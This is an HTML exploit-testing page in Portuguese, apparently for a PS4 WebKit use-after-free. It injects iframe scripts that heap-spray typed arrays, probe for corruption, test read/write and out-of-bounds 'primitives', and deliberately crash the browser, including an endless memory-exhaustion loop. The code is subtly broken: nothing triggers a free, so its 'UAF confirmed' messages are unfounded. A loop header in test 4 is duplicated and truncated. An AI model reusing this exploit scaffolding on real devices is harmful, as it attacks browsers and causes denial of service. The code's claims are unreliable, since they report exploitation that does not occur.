<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit UAF - Testes Corrigidos</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 10px; margin: 0; }
        button { background: #0f0; color: #000; border: none; padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
        button:disabled { background: #333; color: #666; }
        .log { background: #111; border: 1px solid #0f0; padding: 5px; margin: 5px 0; height: 250px; overflow-y: auto; font-size: 11px; }
        .test { border: 1px solid #0f0; padding: 10px; margin: 10px 0; }
        .success { color: #0f0; }
        .warning { color: #ff0; }
        .error { color: #f00; }
        .info { color: #0af; }
        h1 { color: #0f0; font-size: 20px; margin: 10px 0; }
        h2 { color: #0f0; font-size: 16px; margin: 5px 0; }
        .instructions { border: 2px solid #ff0; padding: 10px; margin: 10px 0; background: #222; }
    </style>
</head>
<body>

<h1>ğŸ”¬ PS4 WebKit UAF - Testes de Sanidade</h1>

<div class="instructions">
    <strong>âš¡ SEQUÃŠNCIA CORRETA:</strong><br>
    1. Clique no botÃ£o do teste<br>
    2. Iframe abre em FULLSCREEN automaticamente<br>
    3. Aperte <strong>OPTIONS</strong> no controle (dispara onblur)<br>
    4. Teste executa automaticamente<br>
    5. document.write() mata o iframe<br>
    6. Logs aparecem aqui na pÃ¡gina principal
</div>

<div class="test">
    <h2>ğŸ§ª Teste 1: DetecÃ§Ã£o de CorrupÃ§Ã£o UAF</h2>
    <p>Verifica se Float64Arrays sÃ£o corrompidos pelo heap spray</p>
    <button id="btn1" onclick="runTest(1)">â–¶ Executar Teste 1</button>
    <button onclick="clearLog('log1')">ğŸ—‘ Limpar</button>
    <div id="log1" class="log"></div>
</div>

<div class="test">
    <h2>ğŸ¯ Teste 2: Primitiva de Escrita (R/W)</h2>
    <p>Testa se consegue escrever e ler valores arbitrÃ¡rios</p>
    <button id="btn2" onclick="runTest(2)">â–¶ Executar Teste 2</button>
    <button onclick="clearLog('log2')">ğŸ—‘ Limpar</button>
    <div id="log2" class="log"></div>
</div>

<div class="test">
    <h2>ğŸ“– Teste 3: Out-of-Bounds Read</h2>
    <p>Tenta ler alÃ©m dos limites para vazamento de memÃ³ria</p>
    <button id="btn3" onclick="runTest(3)">â–¶ Executar Teste 3</button>
    <button onclick="clearLog('log3')">ğŸ—‘ Limpar</button>
    <div id="log3" class="log"></div>
</div>

<div class="test">
    <h2>ğŸ”€ Teste 4: Type Confusion Check</h2>
    <p>Verifica se afeta objetos JavaScript normais</p>
    <button id="btn4" onclick="runTest(4)">â–¶ Executar Teste 4</button>
    <button onclick="clearLog('log4')">ğŸ—‘ Limpar</button>
    <div id="log4" class="log"></div>
</div>

<div class="test">
    <h2>ğŸ’‰ Teste 5: Heap Spray Effectiveness</h2>
    <p>Mede efetividade de diferentes tamanhos de spray</p>
    <button id="btn5" onclick="runTest(5)">â–¶ Executar Teste 5</button>
    <button onclick="clearLog('log5')">ğŸ—‘ Limpar</button>
    <div id="log5" class="log"></div>
</div>

<div class="test">
    <h2>ğŸ’¥ Teste 6: Crash Controllability</h2>
    <p style="color:#f00;">âš ï¸ ESTE TESTE VAI CRASHAR O IFRAME!</p>
    <button id="btn6" onclick="runTest(6)">â–¶ Executar Teste 6 (CRASH)</button>
    <button onclick="clearLog('log6')">ğŸ—‘ Limpar</button>
    <div id="log6" class="log"></div>
</div>

<iframe id="testFrame" style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;"></iframe>

<script>
let currentTest = 0;
let testTimeout = null;

// Receber mensagens do iframe
window.addEventListener('message', function(e) {
    if (e.data.type === 'log') {
        log('log' + currentTest, e.data.message, e.data.level);
    } else if (e.data.type === 'complete') {
        completeTest();
    }
});

function log(logId, message, level = 'info') {
    const logDiv = document.getElementById(logId);
    const time = new Date().toLocaleTimeString();
    logDiv.innerHTML += '<div class="' + level + '">[' + time + '] ' + message + '</div>';
    logDiv.scrollTop = logDiv.scrollHeight;
}

function clearLog(logId) {
    document.getElementById(logId).innerHTML = '';
}

function completeTest() {
    log('log' + currentTest, 'âœ… Teste completado', 'success');
    document.getElementById('btn' + currentTest).disabled = false;
    
    if (testTimeout) {
        clearTimeout(testTimeout);
        testTimeout = null;
    }
    
    // Destruir e recriar iframe
    setTimeout(() => {
        const frame = document.getElementById('testFrame');
        frame.parentNode.removeChild(frame);
        const newFrame = document.createElement('iframe');
        newFrame.id = 'testFrame';
        newFrame.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
        document.body.appendChild(newFrame);
    }, 1000);
}

function runTest(testNum) {
    currentTest = testNum;
    clearLog('log' + testNum);
    
    log('log' + testNum, 'ğŸš€ Iniciando Teste ' + testNum, 'info');
    log('log' + testNum, 'ğŸ“º Criando iframe...', 'info');
    
    document.getElementById('btn' + testNum).disabled = true;
    
    // Timeout de seguranÃ§a
    testTimeout = setTimeout(() => {
        log('log' + testNum, 'â±ï¸ TIMEOUT - Teste nÃ£o completou em 30s', 'error');
        log('log' + testNum, 'ğŸ’¡ VocÃª apertou OPTIONS apÃ³s entrar em fullscreen?', 'warning');
        document.getElementById('btn' + testNum).disabled = false;
    }, 30000);
    
    // Injetar HTML no iframe
    const iframe = document.getElementById('testFrame');
    const doc = iframe.contentDocument || iframe.contentWindow.document;
    doc.open();
    doc.write(getTestHTML(testNum));
    doc.close();
}

function getTestHTML(testNum) {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Teste ${testNum}</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            background: #000;
            color: #0f0;
            font-family: monospace;
            font-size: 28px;
            text-align: center;
        }
        #status {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
        }
        .pulse {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }
    </style>
</head>
<body>
    <div id="status">
        <h1>TESTE ${testNum}</h1>
        <p id="msg" class="pulse">Preparando...</p>
    </div>
    
    <script>
        const TEST_NUM = ${testNum};
        
        function log(message, level = 'info') {
            window.parent.postMessage({
                type: 'log',
                message: message,
                level: level
            }, '*');
        }
        
        function complete() {
            window.parent.postMessage({
                type: 'complete'
            }, '*');
        }
        
        function msg(text) {
            document.getElementById('msg').textContent = text;
        }
        
        function toHex(value) {
            try {
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = value;
                return '0x' + Array.from(new Uint8Array(buf))
                    .reverse()
                    .map(b => b.toString(16).padStart(2, '0'))
                    .join('');
            } catch(e) {
                return 'ERROR';
            }
        }
        
        // SEQUÃŠNCIA CORRETA DO POC ORIGINAL
        setTimeout(() => {
            msg('Solicitando Fullscreen...');
            log('ğŸ–¥ï¸ Solicitando fullscreen...', 'info');
            
            const doc = document.documentElement;
            const requestFS = doc.webkitRequestFullscreen || doc.requestFullscreen;
            
            if (requestFS) {
                requestFS.call(doc).then(() => {
                    msg('FULLSCREEN ATIVO!\\n\\nğŸ® APERTE OPTIONS AGORA!');
                    log('âœ… Fullscreen ativado com sucesso!', 'success');
                    log('â³ Aguardando onblur (OPTIONS)...', 'warning');
                    
                    // ONBLUR - A CHAVE DO EXPLOIT
                    // Este Ã© o evento que dispara quando OPTIONS Ã© pressionado
                    window.onblur = function() {
                        msg('OPTIONS DETECTADO!\\n\\nExecutando teste...');
                        log('âš¡ ONBLUR DISPARADO! (OPTIONS pressionado)', 'error');
                        log('ğŸ”¥ Iniciando exploit...', 'warning');
                        
                        // Executar o teste especÃ­fico
                        executeTest${testNum}();
                    };
                    
                }).catch(err => {
                    log('âŒ Erro ao entrar em fullscreen: ' + err, 'error');
                    msg('ERRO NO FULLSCREEN');
                    setTimeout(() => complete(), 2000);
                });
            } else {
                log('âŒ Fullscreen API nÃ£o disponÃ­vel', 'error');
                msg('FULLSCREEN NÃƒO DISPONÃVEL');
                setTimeout(() => complete(), 2000);
            }
        }, 500);
        
        ${getTestCode(testNum)}
    <\/script>
</body>
</html>`;
}

function getTestCode(testNum) {
    const tests = {
        1: `
function executeTest1() {
    let victims = [];
    const MAGIC_PATTERN = 2.121995791e-314; // 0x4141414141414141
    const VICTIM_COUNT = 3000;
    
    log('ğŸ“¦ Criando ' + VICTIM_COUNT + ' arrays Float64...', 'info');
    msg('Criando vÃ­timas...');
    
    for(let i = 0; i < VICTIM_COUNT; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        arr[1] = i * 2;
        victims.push(arr);
    }
    log('âœ… ' + VICTIM_COUNT + ' arrays criados', 'success');
    
    // HEAP SPRAY (igual ao POC original)
    msg('Executando spray...');
    log('ğŸ’‰ Iniciando heap spray com padrÃ£o 0x4141...', 'info');
    
    let spray = [];
    for(let i = 0; i < 10000; i++) {
        const poison = new Float64Array(32);
        poison.fill(MAGIC_PATTERN);
        spray.push(poison);
    }
    log('âœ… Heap spray completo (10000 arrays)', 'success');
    
    // VERIFICAR CORRUPÃ‡ÃƒO
    msg('Verificando corrupÃ§Ã£o...');
    log('ğŸ” Procurando arrays corrompidos...', 'info');
    
    let corruptedCount = 0;
    let corruptedIndexes = [];
    
    for(let i = 0; i < victims.length; i++) {
        if (victims[i][0] === MAGIC_PATTERN) {
            corruptedCount++;
            corruptedIndexes.push(i);
            
            if (corruptedCount <= 5) {
                log('ğŸ¯ CORRUPÃ‡ÃƒO DETECTADA no index ' + i, 'error');
                log('   Valor original: ' + i, 'info');
                log('   Valor atual: ' + toHex(victims[i][0]), 'error');
                log('   Offset[1]: ' + toHex(victims[i][1]), 'info');
            }
        }
    }
    
    if (corruptedCount > 0) {
        const rate = (corruptedCount / VICTIM_COUNT * 100).toFixed(2);
        log('', 'success');
        log('ğŸ”¥ğŸ”¥ğŸ”¥ UAF CONFIRMADO! ğŸ”¥ğŸ”¥ğŸ”¥', 'error');
        log('ğŸ“Š Total corrompidos: ' + corruptedCount + ' de ' + VICTIM_COUNT, 'error');
        log('ğŸ“ˆ Taxa de corrupÃ§Ã£o: ' + rate + '%', 'warning');
        log('ğŸ“ Primeiros Ã­ndices: ' + corruptedIndexes.slice(0, 10).join(', '), 'info');
        msg('UAF CONFIRMADO!\\n' + corruptedCount + ' arrays\\ncorrompidos!');
    } else {
        log('âŒ Nenhuma corrupÃ§Ã£o detectada nesta execuÃ§Ã£o', 'warning');
        log('ğŸ’¡ Tente executar novamente', 'info');
        msg('Sem corrupÃ§Ã£o detectada');
    }
    
    // MATAR IFRAME COM DOCUMENT.WRITE (igual ao POC original)
    setTimeout(() => {
        log('ğŸ“ Executando document.write() para matar iframe...', 'info');
        try {
            document.open();
            document.write('<html><body><h1>Teste Completo</h1></body></html>');
            document.close();
        } catch(e) {
            log('âš ï¸ Erro no document.write: ' + e.message, 'warning');
        }
        setTimeout(() => complete(), 500);
    }, 2000);
}`,
        
        2: `
function executeTest2() {
    let victims = [];
    const SPRAY_PATTERN = 2.121995791e-314;
    
    log('ğŸ“¦ Preparando vÃ­timas...', 'info');
    msg('Preparando...');
    
    for(let i = 0; i < 3000; i++) {
        let arr = new Float64Array(8);
        arr.fill(0);
        victims.push(arr);
    }
    log('âœ… VÃ­timas prontas', 'success');
    
    msg('Heap spray...');
    log('ğŸ’‰ Heap spray...', 'info');
    
    let spray = [];
    for(let i = 0; i < 8000; i++) {
        let arr = new Float64Array(10);
        arr.fill(SPRAY_PATTERN);
        spray.push(arr);
    }
    log('âœ… Spray completo (8000 arrays)', 'success');
    
    // ENCONTRAR VÃTIMA CORROMPIDA
    msg('Procurando vÃ­tima...');
    log('ğŸ” Procurando array corrompido...', 'info');
    
    let corrupted = null;
    let corruptedIdx = -1;
    
    for(let i = 0; i < victims.length; i++) {
        if (victims[i][0] === SPRAY_PATTERN) {
            corrupted = victims[i];
            corruptedIdx = i;
            break;
        }
    }
    
    if (corrupted) {
        log('ğŸ¯ Array corrompido encontrado no index ' + corruptedIdx, 'error');
        
        // TESTAR ESCRITA CONTROLADA
        msg('Testando escrita...');
        log('âœï¸ Testando primitiva de escrita...', 'info');
        
        const testPatterns = [
            {name: 'DEADBEEF', value: 0xDEADBEEF},
            {name: 'LEET CODE', value: 0x1337C0DE},
            {name: 'AAAA', value: 0x41414141},
            {name: 'BBBB', value: 0x42424242}
        ];
        
        let successCount = 0;
        
        testPatterns.forEach((pattern, idx) => {
            try {
                // Escrever
                const writeBuf = new ArrayBuffer(8);
                new BigUint64Array(writeBuf)[0] = BigInt(pattern.value);
                const floatVal = new Float64Array(writeBuf)[0];
                corrupted[idx] = floatVal;
                
                // Ler de volta
                const readBuf = new ArrayBuffer(8);
                new Float64Array(readBuf)[0] = corrupted[idx];
                const readHex = Number(new BigUint64Array(readBuf)[0]);
                
                if (readHex === pattern.value) {
                    log('   âœ… [' + idx + '] ' + pattern.name + ': WRITE/READ OK (0x' + pattern.value.toString(16) + ')', 'success');
                    successCount++;
                } else {
                    log('   âš ï¸ [' + idx + '] ' + pattern.name + ': MISMATCH! Escrito:0x' + pattern.value.toString(16) + ' Lido:0x' + readHex.toString(16), 'warning');
                }
            } catch(e) {
                log('   âŒ [' + idx + '] ' + pattern.name + ': ERRO - ' + e.message, 'error');
            }
        });
        
        log('', 'info');
        if (successCount === testPatterns.length) {
            log('ğŸ‰ğŸ‰ğŸ‰ PRIMITIVA DE ESCRITA 100% FUNCIONAL! ğŸ‰ğŸ‰ğŸ‰', 'success');
            log('âœ… ' + successCount + '/' + testPatterns.length + ' testes passaram', 'success');
            log('ğŸ“ VocÃª pode escrever valores arbitrÃ¡rios!', 'success');
            msg('ESCRITA 100% OK!\\n' + successCount + '/' + testPatterns.length + ' testes');
        } else {
            log('âš ï¸ Escrita parcial: ' + successCount + '/' + testPatterns.length + ' testes OK', 'warning');
            msg('Escrita parcial\\n' + successCount + '/' + testPatterns.length);
        }
    } else {
        log('âŒ Nenhuma corrupÃ§Ã£o detectada', 'warning');
        msg('Sem corrupÃ§Ã£o');
    }
    
    setTimeout(() => {
        log('ğŸ“ Executando document.write()...', 'info');
        try {
            document.open();
            document.write('<html><body><h1>Teste Completo</h1></body></html>');
            document.close();
        } catch(e) {}
        setTimeout(() => complete(), 500);
    }, 2000);
}`,
        
        3: `
function executeTest3() {
    let victims = [];
    const SPRAY = 2.121995791e-314;
    
    log('ğŸ“¦ Criando vÃ­timas...', 'info');
    for(let i = 0; i < 3000; i++) {
        victims.push(new Float64Array(8));
    }
    
    msg('Spray...');
    log('ğŸ’‰ Heap spray...', 'info');
    let spray = [];
    for(let i = 0; i < 8000; i++) {
        spray.push(new Float64Array(10).fill(SPRAY));
    }
    log('âœ… Spray completo', 'success');
    
    msg('Testando OOB...');
    log('ğŸ” Procurando vÃ­tima...', 'info');
    let corrupted = victims.find(v => v[0] === SPRAY);
    
    if (corrupted) {
        log('ğŸ¯ VÃ­tima encontrada!', 'error');
        log('ğŸ“– Tentando leitura Out-of-Bounds...', 'info');
        
        const readLimits = [8, 16, 32, 64, 128, 256];
        let maxOOB = 0;
        
        readLimits.forEach(limit => {
            let successReads = 0;
            let uniqueValues = new Set();
            
            for(let i = 0; i < limit; i++) {
                try {
                    const val = corrupted[i];
                    if (val !== undefined && !isNaN(val)) {
                        successReads++;
                        uniqueValues.add(toHex(val));
                    }
                } catch(e) {
                    break;
                }
            }
            
            log('Tentativa ' + limit + ': ' + successReads + ' lidos, ' + uniqueValues.size + ' Ãºnicos', 'info');
            
            if (successReads > 8) {
                const extraBytes = (successReads - 8) * 8;
                maxOOB = Math.max(maxOOB, extraBytes);
                log('   ğŸ”¥ OOB READ! +' + extraBytes + ' bytes alÃ©m do limite', 'error');
            }
        });
        
        if (maxOOB > 0) {
            log('', 'success');
            log('ğŸ”¥ OOB READ CONFIRMADO!', 'error');
            log('ğŸ“ MÃ¡ximo lido: +' + maxOOB + ' bytes', 'error');
            msg('OOB READ!\\n+' + maxOOB + ' bytes');
        } else {
            log('âŒ Sem OOB read detectado', 'warning');
            log('âš ï¸ Leitura limitada a 8 elementos (64 bytes)', 'info');
            msg('Sem OOB');
        }
    } else {
        log('âŒ Sem corrupÃ§Ã£o', 'warning');
        msg('Sem corrupÃ§Ã£o');
    }
    
    setTimeout(() => {
        log('ğŸ“ Executando document.write()...', 'info');
        try {
            document.open();
            document.write('<html><body><h1>Teste Completo</h1></body></html>');
            document.close();
        } catch(e) {}
        setTimeout(() => complete(), 500);
    }, 2000);
}`,
        
        4: `
function executeTest4() {
    let typedVictims = [];
    let objVictims = [];
    
    log('ğŸ“¦ Criando objetos mistos...', 'info');
    msg('Criando objetos...');
    
    for(let i = 0; i < 1500
for(let i = 0; i < 1500; i++) {
        typedVictims.push(new Float64Array(8));
        // Criando objetos simples para ver se o spray afeta a estabilidade deles
        objVictims.push({id: i, marker: 0xDEAD, value: i * 2});
    }
    
    msg('Executando Spray Misto...');
    log('ğŸ’‰ Spray misto (Float e Objetos)...', 'info');
    
    let spray = [];
    const SPRAY_VAL = 2.121995791e-314; // 0x4141...
    
    for(let i = 0; i < 5000; i++) {
        spray.push(new Float64Array(16).fill(SPRAY_VAL));
        spray.push({a: SPRAY_VAL, b: SPRAY_VAL}); // Objetos no meio do heap
    }
    log('âœ… Spray concluÃ­do', 'success');

    msg('Verificando integridade...');
    log('ğŸ” Checando se objetos JS sobreviveram...', 'info');

    let errorCount = 0;
    // Verificar se os objetos normais mantiveram seus valores
    for(let i = 0; i < objVictims.length; i++) {
        if (objVictims[i].marker !== 0xDEAD || objVictims[i].value !== i * 2) {
            errorCount++;
        }
    }

    // Verificar se Arrays foram corrompidos (Type Confusion potencial)
    let uafCount = 0;
    for(let i = 0; i < typedVictims.length; i++) {
        if (typedVictims[i][0] === SPRAY_VAL) {
            uafCount++;
        }
    }

    if (errorCount > 0) {
        log('âš ï¸ ALERTA: ' + errorCount + ' objetos JS foram corrompidos!', 'warning');
        log('â˜¢ï¸ Isso indica instabilidade severa no Heap!', 'error');
        msg('INSTABILIDADE DETECTADA!');
    } else {
        log('âœ… Objetos JS intactos. CorrupÃ§Ã£o contida.', 'success');
    }

    if (uafCount > 0) {
        log('ğŸ”¥ UAF detectado em ' + uafCount + ' arrays tipados.', 'success');
        msg('UAF OK - Objetos OK');
    } else {
        log('âŒ UAF nÃ£o disparou neste teste.', 'warning');
        msg('Falha no UAF');
    }

    setTimeout(() => {
        try {
            document.open();
            document.write('Done');
            document.close();
        } catch(e){}
        setTimeout(() => complete(), 500);
    }, 2000);
}`,

        5: `
function executeTest5() {
    // ESTE TESTE TENTA DESCOBRIR O TAMANHO IDEAL DO SPRAY
    const SIZES = [1000, 5000, 10000, 20000];
    let currentSizeIdx = 0;
    
    log('ğŸ§ª Iniciando teste progressivo de Spray...', 'info');
    
    function runNextBatch() {
        if (currentSizeIdx >= SIZES.length) {
            log('ğŸ Testes de tamanho finalizados.', 'info');
            finish();
            return;
        }

        const size = SIZES[currentSizeIdx];
        log('ğŸ“ Testando Spray com ' + size + ' elementos...', 'info');
        msg('Testando spray: ' + size);

        // Setup VÃ­timas
        let victims = [];
        for(let i=0; i<2000; i++) victims.push(new Float64Array(8));

        // Setup Spray
        let spray = [];
        const VAL = 2.121995791e-314;
        
        // Executar Spray
        const start = performance.now();
        for(let i=0; i<size; i++) {
            let arr = new Float64Array(32);
            arr.fill(VAL);
            spray.push(arr);
        }
        const end = performance.now();
        
        // Check
        let corrupted = 0;
        for(let i=0; i<victims.length; i++) {
            if(victims[i][0] === VAL) corrupted++;
        }

        const timeTaken = (end - start).toFixed(0);
        
        if (corrupted > 0) {
            log('âœ… Tamanho ' + size + ': ' + corrupted + ' corrompidos (' + timeTaken + 'ms)', 'success');
        } else {
            log('âŒ Tamanho ' + size + ': Falhou (' + timeTaken + 'ms)', 'warning');
        }

        // Limpar memÃ³ria (tentativa)
        victims = null;
        spray = null;
        
        currentSizeIdx++;
        setTimeout(runNextBatch, 500);
    }

    function finish() {
        msg('Teste Finalizado');
        setTimeout(() => {
            try { document.open(); document.write('Done'); document.close(); } catch(e){}
            setTimeout(() => complete(), 500);
        }, 1000);
    }

    runNextBatch();
}`,

        6: `
function executeTest6() {
    msg('PREPARANDO CRASH...');
    log('ğŸ’€ MODO KAMIKAZE ATIVADO', 'error');
    log('âš ï¸ Preparando para derrubar o navegador...', 'warning');

    let victims = [];
    const CRASH_VAL = 2.121995791e-314; // 0x4141...

    for(let i = 0; i < 5000; i++) victims.push(new Float64Array(8));

    msg('SPRAYING...');
    let spray = [];
    for(let i = 0; i < 15000; i++) {
        spray.push(new Float64Array(32).fill(CRASH_VAL));
    }

    msg('BUSCANDO TRIGGER...');
    let corrupted = victims.find(v => v[0] === CRASH_VAL);

    if (corrupted) {
        log('ğŸ¯ VÃ­tima encontrada! Iniciando colisÃ£o...', 'error');
        msg('TCHAU TCHAU! ğŸ‘‹');
        
        setTimeout(() => {
            // TENTATIVA 1: Loop infinito de acesso invÃ¡lido
            log('ğŸ’¥ Executando acesso invÃ¡lido...', 'error');
            try {
                // Tentar corromper o ponteiro de backing store se possÃ­vel,
                // ou apenas ler muito fora dos limites repetidamente
                for(let i = 0; i < 1000000; i++) {
                    let x = corrupted[100000 + i]; // OOB massivo
                    corrupted[i * 1000] = 1.1;     // Escrita aleatÃ³ria
                }
            } catch(e) {
                log('âŒ Crash falhou via JS (pegou exceÃ§Ã£o): ' + e, 'warning');
            }
            
            // TENTATIVA 2: Force Reload agressivo se ainda estiver vivo
            window.location.reload();
        }, 500);
    } else {
        log('âŒ NÃ£o houve corrupÃ§Ã£o, nÃ£o posso crashar via UAF.', 'warning');
        log('ğŸ”¨ Tentando crashar via alocaÃ§Ã£o massiva...', 'info');
        
        setTimeout(() => {
            try {
                let crashArr = [];
                while(true) crashArr.push(new Uint8Array(1024*1024*10)); // OOM
            } catch(e) {}
        }, 1000);
    }
}`
    };

    return tests[testNum] || 'function executeTest() { log("Teste desconhecido", "error"); }';
}
    </script>
</body>
</html>
